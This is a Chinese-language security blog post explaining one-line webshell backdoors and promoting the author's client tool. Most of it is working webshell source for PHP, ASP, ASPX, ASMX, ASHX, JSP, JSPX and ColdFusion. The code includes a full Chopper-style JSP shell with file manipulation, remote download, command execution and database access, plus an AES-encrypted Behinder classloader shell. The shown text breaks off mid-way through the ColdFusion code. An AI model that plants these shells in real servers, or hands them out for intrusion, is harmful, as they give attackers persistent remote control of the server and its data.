<!DOCTYPE html><html lang="en-us" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>【Tech】一句話木馬 | ISSAC/iss4cf0ng's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":true,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
 menuSettings: {
   zoom: "None"
 },
 showMathMenu: false,
 jax: ["input/TeX","output/CommonHTML"],
 extensions: ["tex2jax.js"],
 TeX: {
   extensions: ["AMSmath.js","AMSsymbols.js"],
   equationNumbers: {
     autoNumber: "AMS"
   }
 },
 tex2jax: {
   inlineMath: [["\\(", "\\)"]],
   displayMath: [["\\[", "\\]"]]
 }
});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ISSAC/iss4cf0ng's blog" type="application/atom+xml">
</head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/About/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/Alien/"><span class="navItemTitle">Alien</span></a></li><li class="navItem"><a class="navBlock" href="/2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/"><span class="navItemTitle">DuplexSpy</span></a></li><li class="navItem"><a class="navBlock" href="/Notes/"><span class="navItemTitle">Notes</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>【Tech】一句話木馬</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-06-05T17:04:54.000Z" id="date"> 2023-06-06</time></div></span><br><span>Last Update: <div class="control"><time datetime="2026-02-08T12:56:49.727Z" id="updated"> 2026-02-08</time></div></span><br><span>Word Count: <div class="control">3.7k</div></span><br><span>Read Time: <div class="control">21 min</div></span></div></div><hr><div id="post-content"><h1 id="甚麼是WebShell"><a href="#甚麼是WebShell" class="headerlink" title="甚麼是WebShell"></a>甚麼是WebShell</h1><p>WebShell是在滲透測試和入侵時都會用到的工具，是一種後門，<br>需要注意的時WebShell和網頁木馬不一樣，網頁木馬是掛在正常網頁上的木馬程式，<br>當使用者瀏覽網頁時就會下載或執行木馬。<br>WebShell是用來控制一整個網頁伺服器的工具。<br>WebShell有以下三種 :</p>
<ul>
<li>大馬 : 檔案大，30~70KB以上，加密後會超過100KB。</li>
<li>小馬 : 檔案小，一般在10KB以下<ul>
<li>指令執行木馬 : 只能簡單地執行的Shell Command.</li>
<li>一句話木馬 : 功能可超越大馬，容易隱藏和改造。             </li>
</ul>
</li>
</ul>
<hr>
<h1 id="一句話木馬"><a href="#一句話木馬" class="headerlink" title="一句話木馬"></a>一句話木馬</h1><p>在現今的入侵和滲透用的webshell基本上用的都是一句話木馬，<br>大馬的好處是所有執行的Payload都是在localhost上進行，<br>不使用HTTP POST，可以不考慮WAF，<br>但因為檔案太大很容易會被發現，而且不容易寫變種。<br>一句話木馬雖然會因為使用HTTP POST會被WAF檢查，<br>但是很容易寫變種和隱藏，還可以直接寫在正常的檔案內。</p>
<hr>
<h1 id="一句話木馬客戶端"><a href="#一句話木馬客戶端" class="headerlink" title="一句話木馬客戶端"></a>一句話木馬客戶端</h1><p>指的是先把對應語言的Payload寫好，再用客戶端發起 POST Request，這樣就會非常方便<br>在大陸以前比較有名的工具叫 中國菜刀，大陸現在比較常用的工具有三個 :</p>
<ul>
<li>蟻劍</li>
<li>Godzilla</li>
<li>冰蝎      </li>
</ul>
<p>這邊推一下我自己寫的Alien<br><a target="_blank" rel="noopener" href="https://malbuffer4pt.github.io/Alien">https://malbuffer4pt.github.io/Alien</a></p>
<hr>
<h1 id="一句話木馬的程式"><a href="#一句話木馬的程式" class="headerlink" title="一句話木馬的程式"></a>一句話木馬的程式</h1><p>在伺服器沒有裝WAF，Anti-Virus時，只需要用這不到 1KB的程式就可以控制一整台伺服器<br>如下圖 (工具: Alien)<br class='item-img' data-src='pic/oneshell/1.png'><img src="pic/oneshell/1.png" alt=""></p>
<p>以php為例，PHP一句話木馬為<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?php @eval($_POST[&#x27;pass&#x27;]); ?&gt;<br></code></pre></td></tr></table></figure><br>$_POST[‘pass’] : 取得HTTP POST參數為pass的Data<br>@eval($str); : 把 $str 以PHP Code執行  , @ 代表如果 $str == null時就不顯示結果(這樣就增加了隱密性。)<br>所以 @eval($_POST[‘pass’]); 就可以把HTTP POST的內容執行, 如 :<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pass=phpinfo();<br></code></pre></td></tr></table></figure><br>就可執行phphinfo();  </p>
<p>ASP :<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;% execute(request(&quot;pass&quot;)) %&gt;<br></code></pre></td></tr></table></figure></p>
<p>ASPX :<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;<br>&lt;%eval(Request.Item[&quot;pass&quot;])%&gt;<br></code></pre></td></tr></table></figure></p>
<h2 id="關於ASMX-ASHX-CFM-JSP-JSPX和NodeJS木馬"><a href="#關於ASMX-ASHX-CFM-JSP-JSPX和NodeJS木馬" class="headerlink" title="關於ASMX, ASHX, CFM, JSP, JSPX和NodeJS木馬"></a>關於ASMX, ASHX, CFM, JSP, JSPX和NodeJS木馬</h2><p>它們的特點都是沒有「好用」(對攻撃者而言)的eval()函數，或者使用上會比較麻煩…<br>ASMX和ASHX是我在Freebuf上找到的，作者是Ivan，<br>這也有寫進Alien內。<br>而CFM是一個很老的東西了…</p>
<h3 id="ASMX"><a href="#ASMX" class="headerlink" title="ASMX"></a>ASMX</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;%@ WebService Language=&quot;JScript&quot; class=&quot;ScriptMethodSpy&quot;%&gt;<br>import System;<br>import System.Web;<br>import System.IO;<br>import System.Web.Services<br>import System.Web.Script.Services<br>public class ScriptMethodSpy extends WebService<br>&#123;      <br>    WebMethodAttribute ScriptMethodAttribute function Invoke(Ivan : String) : Void<br>    &#123;<br>            var I = HttpContext.Current;<br>        var Request = I.Request;<br>        var Response = I.Response;<br>        var Server = I.Server;<br>    Response.Write(&quot;&lt;H1&gt;Just for Research Learning, Do Not Abuse It! Written By &lt;a href=&#x27;https://github.com/Ivan1ee&#x27;&gt;Ivan1ee&lt;/a&gt;&lt;/H1&gt;&quot;);<br>        eval(Ivan);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<h3 id="ASHX"><a href="#ASHX" class="headerlink" title="ASHX"></a>ASHX</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;%@ WebHandler Language=&quot;JScript&quot;class=&quot; HandlerSpy &quot;%&gt;<br>import System;<br>import System.Web;<br>import System.IO;<br>public class HandlerSpy implements IHttpHandler&#123;<br>   function IHttpHandler.ProcessRequest(context : HttpContext)&#123;<br>           context.Response.Write(&quot;&lt;H1&gt;Just for fun, Do not abuse it!Written by &lt;ahref=&#x27;https://github.com/Ivan1ee&#x27;&gt;Ivan1ee&lt;/a&gt;&lt;/H1&gt; &quot;);<br>           eval(context.Request[&quot;Ivan&quot;]);<br>        &#125;<br>    function get IHttpHandler.IsReusable() : Boolean&#123;<br>            return false;<br>       &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h3><p>JSP目前主要有兩種，菜刀形和冰蝎形<br>菜刀形 :<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;%@page import=&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;%&gt;<br>&lt;%!<br>String Pwd=&quot;sky&quot;;<br>String EC(String s,String c)throws Exception&#123;return s;&#125;//new String(s.getBytes(&quot;ISO-8859-1&quot;),c);&#125;<br>Connection GC(String s)throws Exception&#123;String[] x=s.trim().split(&quot;\r\n&quot;);Class.forName(x[0].trim()).newInstance();<br>Connection c=DriverManager.getConnection(x[1].trim());if(x.length&gt;2)&#123;c.setCatalog(x[2].trim());&#125;return c;&#125;<br>void AA(StringBuffer sb)throws Exception&#123;File r[]=File.listRoots();for(int i=0;i&lt;r.length;i++)&#123;sb.append(r[i].toString().substring(0,2));&#125;&#125;<br>void BB(String s,StringBuffer sb)throws Exception&#123;File oF=new File(s),l[]=oF.listFiles();String sT, sQ,sF=&quot;&quot;;java.util.Date dt;<br>SimpleDateFormat fm=new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);for(int i=0;i&lt;l.length;i++)&#123;dt=new java.util.Date(l[i].lastModified());<br>sT=fm.format(dt);sQ=l[i].canRead()?&quot;R&quot;:&quot;&quot;;sQ+=l[i].canWrite()?&quot; W&quot;:&quot;&quot;;if(l[i].isDirectory())&#123;sb.append(l[i].getName()+&quot;/\t&quot;+sT+&quot;\t&quot;+l[i].length()+&quot;\t&quot;+sQ+&quot;\n&quot;);&#125;<br>else&#123;sF+=l[i].getName()+&quot;\t&quot;+sT+&quot;\t&quot;+l[i].length()+&quot;\t&quot;+sQ+&quot;\n&quot;;&#125;&#125;sb.append(sF);&#125;<br>void EE(String s)throws Exception&#123;File f=new File(s);if(f.isDirectory())&#123;File x[]=f.listFiles();<br>for(int k=0;k&lt;x.length;k++)&#123;if(!x[k].delete())&#123;EE(x[k].getPath());&#125;&#125;&#125;f.delete();&#125;<br>void FF(String s,HttpServletResponse r)throws Exception&#123;int n;byte[] b=new byte[512];r.reset();<br>ServletOutputStream os=r.getOutputStream();BufferedInputStream is=new BufferedInputStream(new FileInputStream(s));<br>os.write((&quot;-&gt;&quot;+&quot;|&quot;).getBytes(),0,3);while((n=is.read(b,0,512))!=-1)&#123;os.write(b,0,n);&#125;os.write((&quot;|&quot;+&quot;&lt;-&quot;).getBytes(),0,3);os.close();is.close();&#125;<br>void GG(String s, String d)throws Exception&#123;String h=&quot;0123456789ABCDEF&quot;;int n;File f=new File(s);f.createNewFile();<br>FileOutputStream os=new FileOutputStream(f);for(int i=0;i&lt;d.length();i+=2)<br>&#123;os.write((h.indexOf(d.charAt(i))&lt;&lt;4|h.indexOf(d.charAt(i+1))));&#125;os.close();&#125;<br>void HH(String s,String d)throws Exception&#123;File sf=new File(s),df=new File(d);if(sf.isDirectory())&#123;if(!df.exists())&#123;df.mkdir();&#125;File z[]=sf.listFiles();<br>for(int j=0;j&lt;z.length;j++)&#123;HH(s+&quot;/&quot;+z[j].getName(),d+&quot;/&quot;+z[j].getName());&#125;<br>&#125;else&#123;FileInputStream is=new FileInputStream(sf);FileOutputStream os=new FileOutputStream(df);<br>int n;byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1)&#123;os.write(b,0,n);&#125;is.close();os.close();&#125;&#125;<br>void II(String s,String d)throws Exception&#123;File sf=new File(s),df=new File(d);sf.renameTo(df);&#125;void JJ(String s)throws Exception&#123;File f=new File(s);f.mkdir();&#125;<br>void KK(String s,String t)throws Exception&#123;File f=new File(s);SimpleDateFormat fm=new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);<br>java.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());&#125;<br>void LL(String s, String d)throws Exception&#123;URL u=new URL(s);int n;FileOutputStream os=new FileOutputStream(d);<br>HttpURLConnection h=(HttpURLConnection)u.openConnection();InputStream is=h.getInputStream();byte[] b=new byte[512];<br>while((n=is.read(b,0,512))!=-1)&#123;os.write(b,0,n);&#125;os.close();is.close();h.disconnect();&#125;<br>void MM(InputStream is, StringBuffer sb)throws Exception&#123;String l;BufferedReader br=new BufferedReader(new InputStreamReader(is));<br>while((l=br.readLine())!=null)&#123;sb.append(l+&quot;\r\n&quot;);&#125;&#125;<br>void NN(String s,StringBuffer sb)throws Exception&#123;Connection c=GC(s);ResultSet r=c.getMetaData().getCatalogs();<br>while(r.next())&#123;sb.append(r.getString(1)+&quot;\t&quot;);&#125;r.close();c.close();&#125;<br>void OO(String s,StringBuffer sb)throws Exception&#123;Connection c=GC(s);String[] t=&#123;&quot;TABLE&quot;&#125;;ResultSet r=c.getMetaData().getTables (null,null,&quot;%&quot;,t);<br>while(r.next())&#123;sb.append(r.getString(&quot;TABLE_NAME&quot;)+&quot;\t&quot;);&#125;r.close();c.close();&#125;<br>void PP(String s,StringBuffer sb)throws Exception&#123;String[] x=s.trim().split(&quot;\r\n&quot;);Connection c=GC(s);<br>Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(&quot;select * from &quot;+x[3]);ResultSetMetaData d=r.getMetaData();<br>for(int i=1;i&lt;=d.getColumnCount();i++)&#123;sb.append(d.getColumnName(i)+&quot; (&quot;+d.getColumnTypeName(i)+&quot;)\t&quot;);&#125;r.close();m.close();c.close();&#125;<br>void QQ(String cs,String s,String q,StringBuffer sb)throws Exception&#123;int i;Connection c=GC(s);Statement m=c.createStatement(1005,1008);<br>try&#123;ResultSet r=m.executeQuery(q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(i=1;i&lt;=n;i++)&#123;sb.append(d.getColumnName(i)+&quot;\t|\t&quot;);<br>&#125;sb.append(&quot;\r\n&quot;);while(r.next())&#123;for(i=1;i&lt;=n;i++)&#123;sb.append(EC(r.getString(i),cs)+&quot;\t|\t&quot;);&#125;sb.append(&quot;\r\n&quot;);&#125;r.close();&#125;<br>catch(Exception e)&#123;sb.append(&quot;Result\t|\t\r\n&quot;);try&#123;m.executeUpdate(q);sb.append(&quot;Execute Successfully!\t|\t\r\n&quot;);<br>&#125;catch(Exception ee)&#123;sb.append(ee.toString()+&quot;\t|\t\r\n&quot;);&#125;&#125;m.close();c.close();&#125;<br>%&gt;&lt;%<br>String cs=request.getParameter(&quot;z0&quot;)+&quot;&quot;;request.setCharacterEncoding(cs);response.setContentType(&quot;text/html;charset=&quot;+cs);<br>String Z=EC(request.getParameter(Pwd)+&quot;&quot;,cs);String z1=EC(request.getParameter(&quot;z1&quot;)+&quot;&quot;,cs);String z2=EC(request.getParameter(&quot;z2&quot;)+&quot;&quot;,cs);<br>StringBuffer sb=new StringBuffer(&quot;&quot;);try&#123;sb.append(&quot;-&gt;&quot;+&quot;|&quot;);<br>if(Z.equals(&quot;A&quot;))&#123;String s=new File(application.getRealPath(request.getRequestURI())).getParent();sb.append(s+&quot;\t&quot;);if(!s.substring(0,1).equals(&quot;/&quot;))&#123;AA(sb);&#125;&#125;<br>else if(Z.equals(&quot;B&quot;))&#123;BB(z1,sb);&#125;else if(Z.equals(&quot;C&quot;))&#123;String l=&quot;&quot;;BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));<br>while((l=br.readLine())!=null)&#123;sb.append(l+&quot;\r\n&quot;);&#125;br.close();&#125;<br>else if(Z.equals(&quot;D&quot;))&#123;BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));<br>bw.write(z2);bw.close();sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;E&quot;))&#123;EE(z1);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;F&quot;))&#123;FF(z1,response);&#125;<br>else if(Z.equals(&quot;G&quot;))&#123;GG(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;H&quot;))&#123;HH(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;I&quot;))&#123;II(z1,z2);sb.append(&quot;1&quot;);&#125;<br>else if(Z.equals(&quot;J&quot;))&#123;JJ(z1);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;K&quot;))&#123;KK(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;L&quot;))&#123;LL(z1,z2);sb.append(&quot;1&quot;);&#125;<br>else if(Z.equals(&quot;M&quot;))&#123;String[] c=&#123;z1.substring(2),z1.substring(0,2),z2&#125;;Process p=Runtime.getRuntime().exec(c);<br>MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);&#125;else if(Z.equals(&quot;N&quot;))&#123;NN(z1,sb);&#125;else if(Z.equals(&quot;O&quot;))&#123;OO(z1,sb);&#125;<br>else if(Z.equals(&quot;P&quot;))&#123;PP(z1,sb);&#125;else if(Z.equals(&quot;Q&quot;))&#123;QQ(cs,z1,z2,sb);&#125;<br>&#125;catch(Exception e)&#123;sb.append(&quot;ERROR&quot;+&quot;:// &quot;+e.toString());&#125;sb.append(&quot;|&quot;+&quot;&lt;-&quot;);out.print(sb.toString());<br>%&gt;<br></code></pre></td></tr></table></figure><br>菜刀形就是把所有功能全部寫進一個JSP檔，然後在HTTP POST的時候就會以<br>A, B, C, …, M 執行不同Payload，然面再接上一些參數。</p>
<p>下面是冰蝎 :<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;<br>&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;<br>&lt;%<br>if (request.getMethod().equals(&quot;POST&quot;)) &#123;<br>  String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/<br>  session.putValue(&quot;u&quot;,k);<br>  Cipher c=Cipher.getInstance(&quot;AES&quot;);<br>  c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));<br>  new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;<br>  %&gt;<br></code></pre></td></tr></table></figure><br>冰蝎使用的是ClassLoader()，這樣就相當於是一個Eval函數了。</p>
<h3 id="JSPX"><a href="#JSPX" class="headerlink" title="JSPX"></a>JSPX</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt;&lt;jsp:directive.page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;/&gt;&lt;jsp:declaration&gt; class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;&lt;/jsp:declaration&gt;&lt;jsp:scriptlet&gt;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&lt;/jsp:scriptlet&gt;&lt;/jsp:root&gt;<br></code></pre></td></tr></table></figure>
<h3 id="CFM"><a href="#CFM" class="headerlink" title="CFM"></a>CFM</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;CFSET O=&quot;&quot; /&gt;&lt;CFTRY&gt;&lt;CFSWITCH EXPRESSION=#Form.chopper#&gt;&lt;CFCASE VALUE=&quot;A&quot;&gt;&lt;CFSCRIPT&gt;O=O&amp;Expandpath(&quot;./&quot;)&amp;Chr(9);<br>for(c=65;c lt 91;c=c+1)&#123;if(DirectoryExists(Chr(c)&amp;&quot;:\&quot;))O=O&amp;Chr(c)&amp;&quot;:&quot;;&#125;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;B&quot;&gt;<br>&lt;CFDIRECTORY DIRECTORY=&quot;#Form.z1#&quot; NAME=&quot;D&quot; SORT=&quot;Type&quot;&gt;&lt;CFLOOP Query=&quot;D&quot;&gt;&lt;CFSCRIPT&gt;O=O&amp;D.Name;If(D.Type eq &quot;Dir&quot;)O=O&amp;&quot;/&quot;;<br>O=O&amp;Chr(9)&amp;DateFormat(D.DateLastModified,&quot;yyyy-mm-dd&quot;)&amp;TimeFormat(D.DateLastModified,&quot; HH:MM:ss&quot;)&amp;Chr(9)&amp;D.Size&amp;Chr(9);<br>If(Left(Form.z1,1) eq &quot;/&quot;)&#123;O=O&amp;D.Mode;&#125;else&#123;O=O&amp;D.Attributes;&#125;O=O&amp;Chr(10);&lt;/CFSCRIPT&gt;&lt;/CFLOOP&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;C&quot;&gt;<br>&lt;CFFILE ACTION=&quot;Read&quot; FILE=&quot;#Form.z1#&quot; VARIABLE=&quot;O&quot;&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;D&quot;&gt;&lt;CFFILE ACTION=&quot;Write&quot; FILE=&quot;#Form.z1#&quot; OUTPUT=&quot;#Form.z2#&quot;&gt;<br>&lt;CFSET O=&quot;1&quot; /&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;E&quot;&gt;&lt;CFSCRIPT&gt;Function DF(P)&#123;F=CreateObject(&quot;java&quot;,&quot;java.io.File&quot;).init(P);L=0;i=0;<br>if(F.isDirectory())&#123;L=F.listFiles();for(i=1;i lte ArrayLen(L);i=i+1)&#123;if(not L[i].delete())&#123;DF(L[i].getPath());&#125;&#125;&#125;F.delete();&#125;<br>DF(Form.z1);O=&quot;1&quot;;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;F&quot;&gt;&lt;cffile action=&quot;readbinary&quot; file=&quot;#Form.z1#&quot; variable=&quot;B&quot; /&gt;<br>&lt;cfset J=CreateObject(&quot;java&quot;,&quot;java.nio.ByteBuffer&quot;) /&gt;&lt;cfset X=J.Allocate(JavaCast( &quot;int&quot;, ArrayLen(B)+6)) /&gt;<br>&lt;cfset X.Put(ToBinary(ToBase64(&quot;-&gt;&quot;&amp;&quot;|&quot;)), JavaCast(&quot;int&quot;,0), 3 ) /&gt;&lt;cfset X.Put(B, JavaCast(&quot;int&quot;,0), JavaCast(&quot;int&quot;,ArrayLen(B)) ) /&gt;<br>&lt;cfset X.Put(ToBinary(ToBase64(&quot;|&quot;&amp;&quot;&lt;-&quot;)), JavaCast(&quot;int&quot;,0), 3 ) /&gt;&lt;CFCONTENT Type=&quot;application/octet-stream&quot; Variable=&quot;#X.Array()#&quot;&gt;<br>&lt;CFABORT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;G&quot;&gt;&lt;CFSCRIPT&gt;F=CreateObject(&quot;java&quot;,&quot;java.io.FileOutputStream&quot;);F.init(Form.z1);<br>h=&quot;0123456789ABCDEF&quot;;C=Form.z2;for(i=0;i lt Len(C);i=i+2)&#123;F.write(BitOr(BitSHLN(h.indexOf(C.charAt(i)),4),h.indexOf(C.charAt(i+1))));&#125;<br>F.close();O=&quot;1&quot;;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;H&quot;&gt;&lt;CFFUNCTION Name=&quot;cpf&quot;&gt;&lt;CFARGUMENT Name=&quot;S&quot;&gt;&lt;CFARGUMENT Name=&quot;D&quot;&gt;<br>&lt;CFFILE ACTION=&quot;Copy&quot; SOURCE=&quot;#S#&quot; DESTINATION=&quot;#D#&quot;&gt;&lt;/CFFUNCTION&gt;&lt;CFSCRIPT&gt;Function CP(S,D)&#123;sf=CreateObject(&quot;java&quot;,&quot;java.io.File&quot;).init(S);<br>df=CreateObject(&quot;java&quot;,&quot;java.io.File&quot;).init(D);L=0;i=0;if(sf.isDirectory())&#123;if(not df.exists())&#123;df.mkdir();&#125;L=sf.listFiles();<br>for(i=1;i lte ArrayLen(L);i=i+1)&#123;if(L[i].isDirectory())&#123;CP(L[i].getPath(),df.getPath()&amp;&quot;/&quot;&amp;L[i].getName());&#125;else&#123;<br>cpf(L[i].getPath(),df.getPath()&amp;&quot;/&quot;&amp;L[i].getName());&#125;&#125;&#125;else&#123;cpf(S,D);&#125;&#125;CP(Form.z1,Form.z2);O=&quot;1&quot;;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;<br>&lt;CFCASE 